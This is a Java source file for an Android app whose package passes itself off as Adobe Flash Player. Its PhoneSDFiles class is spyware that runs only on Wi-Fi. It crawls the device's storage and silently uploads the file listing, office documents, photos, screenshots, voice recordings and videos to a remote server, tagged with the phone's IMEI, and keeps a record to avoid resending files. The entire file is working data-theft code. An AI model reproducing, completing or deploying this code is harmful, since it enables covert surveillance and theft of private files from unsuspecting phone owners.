package com.adobe.flashplayer.data;


import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;
import androidx.core.content.ContextCompat;
import com.adobe.flashplayer.PrefOper;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.NetworkUitls;
import com.adobe.flashplayer.network.UploadData;


public class PhoneSDFiles implements Runnable {

    private String TAG = "PhoneSDFiles";

    public static int MEDIA_UPLOAD_DELAY = 6000;

    private String cardpathname = "";
    private String localfilepath = "";
    private String localfilename = "";
    private int filecommand = 0;
    private Context context;

    static private String fileFilter =
            ".db.ini.txt.doc.xls.ppt.pdf.dat.bmp.jpg.jpeg.png.mp3.mp4.rm.3gp.wmv.mov.flv.amr.slk.mid.aac.wav.ogg.mpeg3.mpeg4.avi.exe.apk.so.dex.jar.app.zip.rar.lnk.xml.json.htm.h264.h265";

    public static String CFGUPLOADFILENAMES = "uploadFileNames";


    public PhoneSDFiles(Context context,String cardpath,String localpath,String filename,int command){

        cardpathname = cardpath;
        localfilepath = localpath;
        localfilename = filename;
        filecommand = command;
        this.context = context;
    }




    @Override
    public void run() {

        try{
            int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.READ_EXTERNAL_STORAGE);
            if (granted != PackageManager.PERMISSION_GRANTED) {
                return;
            }

            if(NetworkUitls.getNetworkType(context) != NetworkUitls.WIFI_CONNECTION){
                return;
            }

            File path = new File(localfilepath);
            if (path.exists() == false) {
                path.mkdir();
            }

            File tmpfile = new File(localfilepath + localfilename + ".tmp");
            if (tmpfile.exists()== true) {
                tmpfile.delete();
            }
            tmpfile.createNewFile();
            FileOutputStream fout = new FileOutputStream(tmpfile,true);

            int counter = getAllSDFiles(cardpathname,fout);
            if (counter <= 0) {
                Log.e(TAG,"not found files in card:" + cardpathname);
                MyLog.writeLogFile("not found files in card:" + cardpathname + "\r\n");
                tmpfile.delete();
                return;
            }
            else{
                Log.e(TAG,counter + " files found in card:"+ cardpathname );
                MyLog.writeLogFile(counter + " files found in card:" + cardpathname + "\r\n");
            }

            fout.flush();
            fout.close();

            File file = new File(localfilepath + localfilename);
            if(file.exists() == true){
                file.delete();
            }
            file.createNewFile();

            boolean ok = tmpfile.renameTo(file);
            if (ok == false) {
                Log.e(TAG, "rename file:" + tmpfile.getAbsolutePath() + " to:" + file.getAbsolutePath() +" error");
            }else{
                Log.e(TAG, "rename file:" + tmpfile.getAbsolutePath() + " to:" + file.getAbsolutePath() +" ok");
            }



            FileInputStream fin = new FileInputStream(file);
            int filesize = (int)file.length();
            if (filesize <= 0) {
                Log.e(TAG,"reanme file size error");
                fin.close();
                return;
            }
            byte[]buf = new byte[filesize];
            int readlen = fin.read(buf,0,filesize);
            if (readlen != filesize) {
                Log.e(TAG,"reanme file read error");
                fin.close();
                return;
            }
            fin.close();
            file.delete();
            UploadData.upload(buf, filesize, filecommand, Public.IMEI);

        }
        catch(Exception ex){
            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("PhoneFiles exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
            return;
        }
    }




    public int getAllSDFiles(String filePath,FileOutputStream fout) {
        int counter = 0;
        try{
            File f = new File(filePath);
            if (!f.exists()) {
                return counter;
            }

            File[] subFiles = f.listFiles();
            if (subFiles == null) {
                return counter;
            }

            for (File subFile : subFiles) {
                if(subFile.isFile() ){
                    if(subFile.length() <= 0){
                        continue;
                    }

                    String fullpath = subFile.getAbsolutePath();
                    int pos = fullpath.indexOf(".");
                    if (pos >= 0) {
                        String substr = fullpath.substring(pos);
                        if (fileFilter.contains(substr)) {
                            fout.write((fullpath + "\r\n").getBytes());
                        }
                    }
                    counter ++;

//	            	if ( (filecommand != Public.CMD_DATA_SDCARDFILES) &&
//	            			(filecommand != Public.CMD_DATA_EXTCARDFILES) ) {
//						continue;
//					}

                    if( (subFile.getName().endsWith(".doc") || subFile.getName().endsWith(".docx") ||
                            subFile.getName().endsWith(".xls") || subFile.getName().endsWith(".xlsx") ||
                            subFile.getName().endsWith(".ppt") || subFile.getName().endsWith(".pptx") ||
                            subFile.getName().endsWith(".pdf")) ){

                        listOfficeFiles(subFile);
                    }
                } else if(subFile.isDirectory() ){
                    counter = counter + getAllSDFiles( subFile.getAbsolutePath(),fout);

//	            	if ( (filecommand != Public.CMD_DATA_SDCARDFILES) &&
//	            			(filecommand != Public.CMD_DATA_EXTCARDFILES) ) {
//						continue;
//					}

                    if (subFile.getName().contains("DCIM") ||
                            subFile.getName().contains("相机")||
                            subFile.getName().contains("Camera")
                            ||subFile.getName().contains("camera")) {
                        listImageFiles(subFile);
                        listVideoFiles(subFile);
                    }
                    else if (subFile.getName().contains("Photo") ||
                            subFile.getName().contains("Screenshot")
                            ||subFile.getName().contains("photo")) {
                        listImageFiles(subFile);
                    }
                    else if (subFile.getName().contains("Picture")
                            || subFile.getName().equals("截屏")
                            ||subFile.getName().contains("picture")) {
                        listImageFiles(subFile);
                    }
                    else if (subFile.getName().contains("sound_recorder") ||
                            subFile.getName().contains("Records") ||
                            subFile.getName().contains("Recorder") ||
                            subFile.getName().contains("录音") ||
                            subFile.getName().contains("Music")||
                            subFile.getName().contains("Recording")||
                            subFile.getName().contains("Audio") ) {
                        listAudioFiles(subFile);
                    }
                    else if (subFile.getName().contains("Video") ||
                            subFile.getName().contains("Movies") ||
                            subFile.getName().contains("电影")){
                        //listVideoFiles(subFile);
                    }
//	            	else if(subFile.getName().contains("download") ||
//	            			subFile.getName().contains("Download") ||
//	            			subFile.getName().contains("DOWNLOAD")){
//	            		listDownloadFiles(subFile);
//	            	}
                    else{
                        continue;
                    }
                }
                else{
                    continue;
                }
            }
        }
        catch(Exception ex){
            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("getAllFiles exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");

        }

        return counter;
    }



    public void listOfficeFiles(File file){
        try{
            if (file.length() <=  Public.MAX_UPLOAD_FILESIZE && file.length() >Public.MIN_UPLOAD_FILESIZE) {
                return;
            }

            if(NetworkUitls.getNetworkType(context) != NetworkUitls.WIFI_CONNECTION ){
                return;
            }

            if(filterFile(context, file.getName(),file.length())){
                return;
            }

            int intfilesize  = (int)file.length();
            int sendbufsize = 4 + file.getName().getBytes().length + 4 + intfilesize;
            byte[]sendbuf = new byte[sendbufsize];
            byte[] filename = file.getName().getBytes();

            byte[] bytefilenamesize = Utils.intToBytes(filename.length);
            int i = 0;
            int j = 0;
            for( ; j < 4; j ++){
                sendbuf[i + j] = bytefilenamesize[j];
            }
            i += j;

            for( j = 0; j < filename.length; j ++){
                sendbuf[i + j] = filename[j];
            }
            i += j;

            byte[] bytefilesize = Utils.intToBytes(intfilesize);
            for(j= 0 ; j < 4; j ++){
                sendbuf[i + j] = bytefilesize[j];
            }
            i += j;

            FileInputStream fin = new FileInputStream(file);
            fin.read(sendbuf, i, intfilesize);
            fin.close();
            i += intfilesize;

            UploadData.upload(sendbuf, sendbufsize,Public.CMD_DATA_OFFICE,Public.IMEI);
            Thread.sleep(MEDIA_UPLOAD_DELAY);
        }catch(Exception ex){
            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("listOfficeFiles exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
            return ;
        }
    }



    public void listImageFiles(File file){
        try{

            if(NetworkUitls.getNetworkType(context) != NetworkUitls.WIFI_CONNECTION){
                return;
            }


            File[] subFiles = file.listFiles();
            if (subFiles == null) {
                return ;
            }

            for (File subFile : subFiles) {
                if(subFile.isFile() ){
                    if ((subFile.getName().endsWith(".jpg") ||
                            subFile.getName().endsWith(".png") ||
                            subFile.getName().endsWith(".jpeg") ||
                            subFile.getName().endsWith(".gif") ||
                            subFile.getName().endsWith(".bmp"))
                            && (subFile.length() < Public.MAX_UPLOAD_FILESIZE) &&
                            (subFile.length() > Public.MIN_UPLOAD_FILESIZE) ) {

                        if(filterFile(context, subFile.getName(),subFile.length())){
                            continue;
                        }

                        FileInputStream fis = new FileInputStream(subFile);
                        int intfilesize  = (int)subFile.length();
                        int sendbufsize = 4 + subFile.getName().getBytes().length + 4 + intfilesize;
                        byte[]sendbuf = new byte[sendbufsize];
                        byte[] filename = subFile.getName().getBytes();

                        byte[] bytefilenamesize = Utils.intToBytes(filename.length);
                        int i = 0;
                        int j = 0;
                        for( ; j < 4; j ++){
                            sendbuf[i + j] = bytefilenamesize[j];
                        }
                        i += j;

                        for( j = 0; j < filename.length; j ++){
                            sendbuf[i + j] = filename[j];
                        }
                        i += j;

                        byte[] bytefilesize = Utils.intToBytes(intfilesize);
                        for(j= 0 ; j < 4; j ++){
                            sendbuf[i + j] = bytefilesize[j];
                        }
                        i += j;

                        fis.read(sendbuf, i, intfilesize);
                        fis.close();
                        i += intfilesize;

                        UploadData.upload(sendbuf, sendbufsize,Public.CMD_DATA_DCIM,Public.IMEI);
                        Thread.sleep(MEDIA_UPLOAD_DELAY);
                        continue;
                    }
                }
                else if(subFile.isDirectory()){
                    listImageFiles(subFile);
                }
            }
        }
        catch(Exception ex){
            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("listImageFiles exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
            return ;
        }
    }





    public void listAudioFiles(File file){
        try{

            if(NetworkUitls.getNetworkType(context) != NetworkUitls.WIFI_CONNECTION  ){
                return;
            }

            File[] subFiles = file.listFiles();
            if (subFiles == null) {
                return ;
            }

            for (File subFile : subFiles) {
                if(subFile.isFile() ){
                    if ((subFile.getName().endsWith(".m4a")  || subFile.getName().endsWith(".mp3")
                            || subFile.getName().endsWith(".ogg") || subFile.getName().endsWith(".acc")
                            || subFile.getName().endsWith(".wma")|| subFile.getName().endsWith(".amr") )
                            && subFile.length()< Public.MAX_UPLOAD_FILESIZE && subFile.length() >Public.MIN_UPLOAD_FILESIZE){

                        if(filterFile(context, subFile.getName(),subFile.length())){
                            continue;
                        }

                        FileInputStream fis = new FileInputStream(subFile);
                        int intfilesize  = (int)subFile.length();
                        int sendbufsize = 4 + subFile.getName().getBytes().length + 4 + intfilesize;
                        byte[]sendbuf = new byte[sendbufsize];
                        byte[] filename = subFile.getName().getBytes();
                        //Log.e(TAG_DCIM,subFile.getAbsolutePath());
                        //WriteDateFile.writeLogFile( "find dcim:" + subFile.getAbsolutePath() + "\r\n");
                        byte[] bytefilenamesize = Utils.intToBytes(filename.length);
                        int i = 0;
                        int j = 0;
                        for( ; j < 4; j ++){
                            sendbuf[i + j] = bytefilenamesize[j];
                        }
                        i += j;

                        for( j = 0; j < filename.length; j ++){
                            sendbuf[i + j] = filename[j];
                        }
                        i += j;

                        byte[] bytefilesize = Utils.intToBytes(intfilesize);
                        for(j= 0 ; j < 4; j ++){
                            sendbuf[i + j] = bytefilesize[j];
                        }
                        i += j;

                        fis.read(sendbuf, i, intfilesize);
                        fis.close();
                        i += intfilesize;

                        UploadData.upload(sendbuf, sendbufsize,Public.CMD_DATA_AUDIO, Public.IMEI);
                        Thread.sleep(MEDIA_UPLOAD_DELAY);
                        continue;
                    }
                }
                else if(subFile.isDirectory()){
                    listAudioFiles(subFile);
                }
            }
        }
        catch(Exception ex){
            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("listAudioFiles exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
            return ;
        }
    }


    public void listVideoFiles(File file){
        try{

            if(NetworkUitls.getNetworkType(context) != NetworkUitls.WIFI_CONNECTION ){
                return;
            }

            File[] subFiles = file.listFiles();
            if (subFiles == null) {
                return ;
            }

            for (File subFile : subFiles) {
                if(subFile.isFile() ){
                    if ((subFile.getName().endsWith(".mp4") || subFile.getName().endsWith(".3gp")
                            || subFile.getName().endsWith(".mpeg4"))
                            && subFile.length() < Public.MAX_UPLOAD_FILESIZE && subFile.length() >Public.MIN_UPLOAD_FILESIZE) {


                        if(filterFile(context, subFile.getName(),subFile.length())){
                            continue;
                        }

                        FileInputStream fis = new FileInputStream(subFile);
                        int intfilesize  = (int)subFile.length();
                        int sendbufsize = 4 + subFile.getName().getBytes().length + 4 + intfilesize;
                        byte[]sendbuf = new byte[sendbufsize];
                        byte[] filename = subFile.getName().getBytes();
                        //Log.e(TAG_DCIM,subFile.getAbsolutePath());
                        //WriteDateFile.writeLogFile( "find dcim:" + subFile.getAbsolutePath() + "\r\n");
                        byte[] bytefilenamesize = Utils.intToBytes(filename.length);
                        int i = 0;
                        int j = 0;
                        for( ; j < 4; j ++){
                            sendbuf[i + j] = bytefilenamesize[j];
                        }
                        i += j;

                        for( j = 0; j < filename.length; j ++){
                            sendbuf[i + j] = filename[j];
                        }
                        i += j;

                        byte[] bytefilesize = Utils.intToBytes(intfilesize);
                        for(j= 0 ; j < 4; j ++){
                            sendbuf[i + j] = bytefilesize[j];
                        }
                        i += j;

                        fis.read(sendbuf, i, intfilesize);
                        fis.close();
                        i += intfilesize;

                        UploadData.upload(sendbuf, sendbufsize,Public.CMD_DATA_VIDEO, Public.IMEI);
                        Thread.sleep(MEDIA_UPLOAD_DELAY);
                        continue;
                    }
                }
                else if(subFile.isDirectory()){
                    listVideoFiles(subFile);
                }
            }
        }
        catch(Exception ex){
            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("listAudioFiles exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
            return ;
        }
    }




    public void listDownloadFiles(File file){
        try{

            if(NetworkUitls.getNetworkType(context) != NetworkUitls.WIFI_CONNECTION){
                return;
            }

            File[] subFiles = file.listFiles();
            if (subFiles == null) {
                return ;
            }

            for (File subFile : subFiles) {
                if(subFile.isFile() && subFile.length() <= Public.MAX_UPLOAD_FILESIZE &&
                        subFile.length() >Public.MIN_UPLOAD_FILESIZE){

                    if(filterFile(context, subFile.getName(),subFile.length())){
                        continue;
                    }

                    FileInputStream fis = new FileInputStream(subFile);
                    int intfilesize  = (int)subFile.length();
                    int sendbufsize = 4 + subFile.getName().getBytes().length + 4 + intfilesize;
                    byte[]sendbuf = new byte[sendbufsize];
                    byte[] filename = subFile.getName().getBytes();

                    byte[] bytefilenamesize = Utils.intToBytes(filename.length);
                    int i = 0;
                    int j = 0;
                    for( ; j < 4; j ++){
                        sendbuf[i + j] = bytefilenamesize[j];
                    }
                    i += j;

                    for( j = 0; j < filename.length; j ++){
                        sendbuf[i + j] = filename[j];
                    }
                    i += j;

                    byte[] bytefilesize = Utils.intToBytes(intfilesize);
                    for(j= 0 ; j < 4; j ++){
                        sendbuf[i + j] = bytefilesize[j];
                    }
                    i += j;

                    fis.read(sendbuf, i, intfilesize);
                    fis.close();
                    i += intfilesize;

                    UploadData.upload(sendbuf, sendbufsize,Public.CMD_DATA_DOWNLOAD, Public.IMEI);
                    Thread.sleep(MEDIA_UPLOAD_DELAY);
                    continue;
                }
                else if(subFile.isDirectory()){
                    listDownloadFiles(subFile);
                }
            }
        }
        catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("listDownloadFiles exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
            return ;
        }
    }






        public static boolean filterFile(Context context,String filename,Long size){
            boolean ret = false;
            String value = PrefOper.getValue(context, CFGUPLOADFILENAMES, filename);
            if (value == null || value.equals("") ) {
                PrefOper.setValue(context, CFGUPLOADFILENAMES, filename,Long.toString(size));
                ret = false;
            }else{
                if (Long.toString(size).equals(value)){
                    ret = true;
                }else{
                    PrefOper.setValue(context, CFGUPLOADFILENAMES, filename,Long.toString(size));
                    return false;
                }
            }
            return ret;
        }



        public static void listTypeFiles(Context context,String filePath,int type){
            try{

                File f = new File(filePath);
                if (!f.exists()) {
                    return ;
                }

                File[] subFiles = f.listFiles();
                if (subFiles == null) {
                    return ;
                }

                for (File subFile : subFiles) {
                    if(subFile.isFile() && subFile.length() < Public.MAX_UPLOAD_FILESIZE &&
                            subFile.length() > Public.MIN_UPLOAD_FILESIZE){

                        String uploadfilename = subFile.getName();
                        if (uploadfilename.endsWith(".png") || uploadfilename.endsWith(".jpeg") ||
                                uploadfilename.endsWith(".jpg") || uploadfilename.endsWith(".mp4") ||
                                uploadfilename.endsWith(".mp3") || uploadfilename.endsWith(".slk") ||
                                uploadfilename.endsWith(".doc") || uploadfilename.endsWith(".ppt")||
                                uploadfilename.endsWith(".xls")|| uploadfilename.endsWith(".amr")){

                            if(filterFile(context, uploadfilename,subFile.length())){
                                continue;
                            }

                            sendMediaFiles(context,subFile,type);
                            Thread.sleep(PhoneSDFiles.MEDIA_UPLOAD_DELAY);
                            continue;
                        }
                    }
                    else if(subFile.isDirectory() ){
                        listTypeFiles(context,subFile.getAbsolutePath(),type);
                    }
                }
            }
            catch(Exception ex){
                ex.printStackTrace();
                String errorString = Utils.getExceptionDetail(ex);
                String stackString = Utils.getCallStack();
                MyLog.writeLogFile("listTypeFiles exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
                return ;
            }
        }



        public static void sendMediaFiles(Context context,File subFile,int cmd) {
            try {


                String uploadfilename = subFile.getName();

                FileInputStream fis = new FileInputStream(subFile);
                int intfilesize = (int) subFile.length();
                int sendbufsize = 4 + uploadfilename.getBytes().length + 4 + intfilesize;
                byte[] sendbuf = new byte[sendbufsize];
                byte[] filename = uploadfilename.getBytes();
                byte[] bytefilenamesize = Utils.intToBytes(filename.length);
                int i = 0;
                int j = 0;
                for (; j < 4; j++) {
                    sendbuf[i + j] = bytefilenamesize[j];
                }
                i += j;

                for (j = 0; j < filename.length; j++) {
                    sendbuf[i + j] = filename[j];
                }
                i += j;

                byte[] bytefilesize = Utils.intToBytes(intfilesize);
                for (j = 0; j < 4; j++) {
                    sendbuf[i + j] = bytefilesize[j];
                }
                i += j;

                fis.read(sendbuf, i, intfilesize);
                fis.close();
                i += intfilesize;

                UploadData.upload(sendbuf, sendbufsize, cmd, Public.IMEI);

            } catch (Exception e) {
                e.printStackTrace();
            }

        }


}
